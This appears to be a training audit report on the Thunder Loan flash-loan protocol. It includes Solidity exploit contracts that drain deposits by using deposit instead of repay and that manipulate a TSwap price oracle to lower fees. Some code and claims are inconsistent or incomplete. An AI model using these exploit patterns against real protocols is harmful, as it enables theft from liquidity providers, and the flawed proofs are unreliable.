---
title: Thunder-Loan-Audit
author: HadoSama
date: April 27, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---
\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries 6-thunder-Loan-Audit-Report\par}
    \vspace{1cm}
    {\Large Version 0.1\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

# Thunder Loan Audit Report

Prepared by:Hadosama
Lead Auditors: 

- [HadoSama](enter your URL here)

Assisting Auditors:

- None

# Table of contents
<details>

<summary>See table</summary>

- [Thunder Loan Audit Report](#thunder-loan-audit-report)
- [Table of contents](#table-of-contents)
- [About YOUR\_NAME\_HERE](#about-your_name_here)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
- [Protocol Summary](#protocol-summary)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [HIGH](#high)
    - [\[H-1\] Erroneous `ThunderLoan::updateExchange` in the `deposit` function causes protocol to think it has more fees than it really does, which blocks redemption and incorrectly sets the exchange rate](#h-1-erroneous-thunderloanupdateexchange-in-the-deposit-function-causes-protocol-to-think-it-has-more-fees-than-it-really-does-which-blocks-redemption-and-incorrectly-sets-the-exchange-rate)
    - [\[H-2\] `Deposit` function can be used Instead Of Repay To Steal Funds.](#h-2-deposit-function-can-be-used-instead-of-repay-to-steal-funds)
    - [\[H-3\] Mixing up variable location causes storage collisions in ThunderLoan::s\_flashLoanFee and ThunderLoan::s\_currentlyFlashLoaning](#h-3-mixing-up-variable-location-causes-storage-collisions-in-thunderloans_flashloanfee-and-thunderloans_currentlyflashloaning)
  - [Medium](#medium)
    - [\[M-1\] Using TSwap as a price Oracle leads to Price and Oracle Manipulation](#m-1-using-tswap-as-a-price-oracle-leads-to-price-and-oracle-manipulation)
</details>
</br>

# About YOUR_NAME_HERE

<!-- Tell people about you! -->

# Disclaimer

The YOUR_NAME_HERE team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

# Audit Details

- Commit Hash: 8803f851f6b37e99eab2e94b4690c8b70e26b3f6
- In Scope:
```
#-- interfaces
|   #-- IFlashLoanReceiver.sol
|   #-- IPoolFactory.sol
|   #-- ITSwapPool.sol
|   #-- IThunderLoan.sol
#-- protocol
|   #-- AssetToken.sol
|   #-- OracleUpgradeable.sol
|   #-- ThunderLoan.sol
#-- upgradedProtocol
    #-- ThunderLoanUpgraded.sol
```
- Solc Version: 0.8.20
- Chain(s) to deploy contract to: Ethereum
- ERC20s:
  - USDC 
  - DAI
  - LINK
  - WETH

## Scope 
```
#-- interfaces
|   #-- IFlashLoanReceiver.sol
|   #-- IPoolFactory.sol
|   #-- ITSwapPool.sol
|   #-- IThunderLoan.sol
#-- protocol
|   #-- AssetToken.sol
|   #-- OracleUpgradeable.sol
|   #-- ThunderLoan.sol
#-- upgradedProtocol
    #-- ThunderLoanUpgraded.sol
```

# Protocol Summary 

The ThunderLoan protocol is meant to do the following:

1. Give users a way to create flash loans
2. Give liquidity providers a way to earn money off their capital

Liquidity providers can `deposit` assets into `ThunderLoan` and be given `AssetTokens` in return. These `AssetTokens` gain interest over time depending on how often people take out flash loans!

What is a flash loan? 

A flash loan is a loan that exists for exactly 1 transaction. A user can borrow any amount of assets from the protocol as long as they pay it back in the same transaction. If they don't pay it back, the transaction reverts and the loan is cancelled.

Users additionally have to pay a small fee to the protocol depending on how much money they borrow. To calculate the fee, we're using the famous on-chain TSwap price oracle.

We are planning to upgrade from the current `ThunderLoan` contract to the `ThunderLoanUpgraded` contract. Please include this upgrade in scope of a security review. 

## Roles

- Owner: The owner of the protocol who has the power to upgrade the implementation. 
- Liquidity Provider: A user who deposits assets into the protocol to earn interest. 
- User: A user who takes out flash loans from the protocol.

# Executive Summary

Protocol is a lending and Borrowing protocol.

## Issues found

| Severity          | Number of issues found |
| ----------------- | ---------------------- |
| High              | 3                      |
| Medium            | 1                      |
| Low               | 0                      |
| Info              | 0                      |
| Gas Optimizations | 0                      |
| Total             | 0                      |

# Findings

## HIGH

### [H-1] Erroneous `ThunderLoan::updateExchange` in the `deposit` function causes protocol to think it has more fees than it really does, which blocks redemption and incorrectly sets the exchange rate

**Description:**  In the ThunderLoan system, the exchangeRate is responsible for calculating the exchange rate between asset tokens and underlying tokens. In a way it's responsible for keeping track of how many fees to give liquidity providers.

However, the deposit function updates this rate without collecting any fees!

```javascript

function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 exchangeRate = assetToken.getExchangeRate();
    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
    emit Deposit(msg.sender, token, amount);
    assetToken.mint(msg.sender, mintAmount);

    // @Audit-High
@>  // uint256 calculatedFee = getCalculatedFee(token, amount);
@>  // assetToken.updateExchangeRate(calculatedFee);

    token.safeTransferFrom(msg.sender, address(assetToken), amount);
}

```

**Impact:** 
1. The `redeem`  function is blocked because then portocol thinks the owed tokens is more than it has
2. Rewards are incorrectly calculated, leading to liquidity providers potentially getting way more or less than they deserve.

**Proof of Concept:**


<details>
<summary>Proof of Code</summary>

```javascript

function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            amountToBorrow
        );
        // User is minting the fee needed to repay the flash loan.
        // Note that the original testFlashLoan function is minting MORE than necessary
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        vm.startPrank(user);
        thunderLoan.flashloan(
            address(mockFlashLoanReceiver),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();
    }

```

</details>

**Recommended Mitigation:** Remove the incorrect `updateExchangeRate` lines from the deposit.

```diff

function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 exchangeRate = assetToken.getExchangeRate();
    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
    emit Deposit(msg.sender, token, amount);
    assetToken.mint(msg.sender, mintAmount);

    // @Audit-High
-  // uint256 calculatedFee = getCalculatedFee(token, amount);
-  // assetToken.updateExchangeRate(calculatedFee);

    token.safeTransferFrom(msg.sender, address(assetToken), amount);
}

```


### [H-2] `Deposit` function can be used Instead Of Repay To Steal Funds.

**Description:** Malicious users can call the `deposit` function after borrowing from the protocol, then call the `redeem` function to drain the protocol. 

**Impact:** This can lead to malicious users draining funds provided by the liquikdity providers from the protocol.

**Proof of Concept:**
Paste the following code in the ThunderLoanTest.t.sol

<details>

<summary>Proof of Code</summary>

```javascript

function testUseDepositInsteadOfRepayToStealFunds()
        public
        setAllowedToken
        hasDeposits
    {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
    }


contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;

    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool) {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}


```

</details>

**Recommended Mitigation:** Make a mapping of liquidity providers to their deposits, then allow only them to redeem their deposits.


### [H-3] Mixing up variable location causes storage collisions in ThunderLoan::s_flashLoanFee and ThunderLoan::s_currentlyFlashLoaning

**Description:** `ThunderLoan.sol` has two variables in the following order:

```javascript 

uint256 private s_feePrecision;
uint256 private s_flashLoanFee; // 0.3% ETH fee

```

However, the expected upgraded contract `ThunderLoanUpgraded.sol` has them in a different order.

 ```javascript
        uint256 private s_flashLoanFee; // 0.3% ETH fee
        uint256 public constant FEE_PRECISION = 1e18;

```
Due to how Solidity storage works, after the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the positions of storage variables when working with upgradeable contracts.


**Impact:** After upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee. Additionally the `s_currentlyFlashLoaning` mapping will start on the wrong storage slot.

**Proof of Concept:**

<details>

<summary>Code</summary>

Add the following code to the `ThunderLoanTest.t.sol` file.

    ```javascript
    // You'll need to import `ThunderLoanUpgraded` as well
    import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

    function testUpgradeBreaks() public {
            uint256 feeBeforeUpgrade = thunderLoan.getFee();
            vm.startPrank(thunderLoan.owner());
            ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
            thunderLoan.upgradeTo(address(upgraded));
            uint256 feeAfterUpgrade = thunderLoan.getFee();

            assert(feeBeforeUpgrade != feeAfterUpgrade);
        }
    ```
</details>

You can also see the storage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`


**Recommended Mitigation:** Do not switch the positions of the storage variables on upgrade, and leave a blank if you're going to replace a storage variable with a constant. In ThunderLoanUpgraded.sol:


## Medium

### [M-1] Using TSwap as a price Oracle leads to Price and Oracle Manipulation

**Description:**  The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.

**Impact:** Liquidity providers will drastically reduced fees for providing liquidity.

**Proof of Concept:** The following all happens in 1 transaction:

1. User takes a flash loan from ThunderLoan for 1000 tokenA. They are charged the original fee fee1. During the flash loan, they do the following:
   a. User sells 1000 tokenA, tanking the price.
   b. Instead of repaying right away, the user takes out another flash loan for another 1000 tokenA.
    i. Due to the fact that the way ThunderLoan calculates price based on the TSwapPool this second flash loan is substantially cheaper.

```javascript

function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
@>      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }

```
3. The user then repays the first flash loan, and then repays the second flash loan.

Add the following to ThunderLoanTest.t.sol.

<details>

<summary>Proof of Code</summary>

```javascript

function testOracleManipulation() public {
        //setup contracts
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");

        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));

        //Create a TSwap Dex between weth and tokenA
        address tSwapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));

        thunderLoan.initialize(address(pf));

        // fund the Tswap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tSwapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tSwapPool), 100e18);
        BuffMockTSwap(tSwapPool).deposit(
            100e18,
            100e18,
            100e18,
            block.timestamp
        );
        vm.stopPrank();

        // set allowed token
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);

        // fund thunderLoan
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        //Take out two flashLoans

        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("normalFeeCost:", normalFeeCost);
        //296147410319118389

        uint256 amountToBorrow = 50e18;

        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
            address(thunderLoan),
            address(tSwapPool),
            address(thunderLoan.getAssetFromToken(tokenA))
        );

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackedFee = flr.feeOne() + flr.feeTwo();
        console.log("AttackedFee:", attackedFee);
        assert(attackedFee < normalFeeCost);
    }
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tSwapPool;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(
        address _thunderLoan,
        address _tSwapPool,
        address _repayAddress
    ) {
        thunderLoan = ThunderLoan(_thunderLoan);
        tSwapPool = BuffMockTSwap(_tSwapPool);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool) {
        if (!attacked) {
            // Swap TokenA borrowed for WETH
            // Take out Another flashLoan, to show the differece
            feeOne = fee;
            attacked = true;

            uint256 wethBought = tSwapPool.getOutputAmountBasedOnInput(
                50e18,
                100e18,
                100e18
            );
            IERC20(token).approve(address(tSwapPool), 50e18);
            tSwapPool.swapPoolTokenForWethBasedOnInputPoolToken(
                50e18,
                wethBought,
                block.timestamp
            );
            // thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            feeTwo = fee;
            // Calculate the fees and repay
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }

        return true;
    }
}



```

</details>


**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle.




